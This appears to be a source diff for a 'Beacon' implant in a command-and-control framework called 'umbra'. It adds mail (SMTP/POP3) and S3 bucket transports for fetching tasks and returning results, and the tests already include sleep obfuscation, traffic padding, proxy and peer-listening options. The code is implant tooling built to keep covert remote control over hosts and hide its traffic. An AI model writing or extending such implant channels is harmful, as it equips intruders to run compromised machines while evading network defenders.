@@ -370,9 +370,52 @@ impl Beacon {
                 )
                 .map_err(|e| format!("websocket channel: {e}"))?,
             ),
+            Transport::Smtp => {
+                // The mail transport: the frames are mailed out and the
+                // answer is picked up from the mailbox.
+                let secret = crate::mail::agent_secret(&self.cfg.psk, &self.cfg.agent_id);
+                let cfg = crate::mail::MailConfig {
+                    smtp: self.mail_address(&self.cfg.smtp_addr),
+                    pop3: self.mail_address(&self.cfg.pop3_addr),
+                    user: self.cfg.agent_id.clone(),
+                    password: secret,
+                    from: format!("{}@umbra.local", self.cfg.agent_id),
+                    to: format!("{}@umbra.local", self.cfg.agent_id),
+                };
+                Box::new(crate::transport::BatchChannel::new(Box::new(
+                    crate::mail::MailBackend::new(cfg),
+                )))
+            }
+            Transport::S3 => {
+                // The object transport: the work is read from one bucket
+                // and the answer is written into another.
+                let secret = crate::mail::agent_secret(&self.cfg.psk, &self.cfg.agent_id);
+                let cfg = crate::s3::S3Config {
+                    endpoint: self.mail_address(&self.cfg.s3_endpoint),
+                    access_key: self.cfg.agent_id.clone(),
+                    secret_key: secret,
+                    region: self.cfg.s3_region.clone(),
+                    tasks_bucket: self.cfg.s3_tasks_bucket.clone(),
+                    results_bucket: self.cfg.s3_results_bucket.clone(),
+                };
+                Box::new(crate::transport::BatchChannel::new(Box::new(
+                    crate::s3::S3Backend::new(cfg),
+                )))
+            }
         };
         self.channel = Some(ch);
         Ok(())
+    }
+
+    /// The address of a service of the batch transports.
+    ///
+    /// An address that was not configured is the address of the team
+    /// server: the mail and the object endpoints usually live next to it.
+    fn mail_address(&self, configured: &str) -> String {
+        if configured.trim().is_empty() {
+            return self.cfg.server.clone();
+        }
+        configured.trim().to_string()
     }
 
     fn run_once(&mut self) -> Result<bool, String> {
@@ -1025,6 +1068,15 @@ mod tests {
             http_host_header: String::new(),
             http_pad: 0,
             sleep_obfuscate: true,
+            proxy: String::new(),
+            servers: Vec::new(),
+            peer_listen: String::new(),
+            smtp_addr: String::new(),
+            pop3_addr: String::new(),
+            s3_endpoint: String::new(),
+            s3_region: "us-east-1".into(),
+            s3_tasks_bucket: "umbra-tasks".into(),
+            s3_results_bucket: "umbra-results".into(),
         };
         let b = Beacon::new(cfg);
         let mut long = 0;
@@ -1058,6 +1110,15 @@ mod tests {
             http_host_header: String::new(),
             http_pad: 0,
             sleep_obfuscate: false,
+            proxy: String::new(),
+            servers: Vec::new(),
+            peer_listen: String::new(),
+            smtp_addr: String::new(),
+            pop3_addr: String::new(),
+            s3_endpoint: String::new(),
+            s3_region: "us-east-1".into(),
+            s3_tasks_bucket: "umbra-tasks".into(),
+            s3_results_bucket: "umbra-results".into(),
         };
         cfg.sleep = 100;
         let b = Beacon::new(cfg);
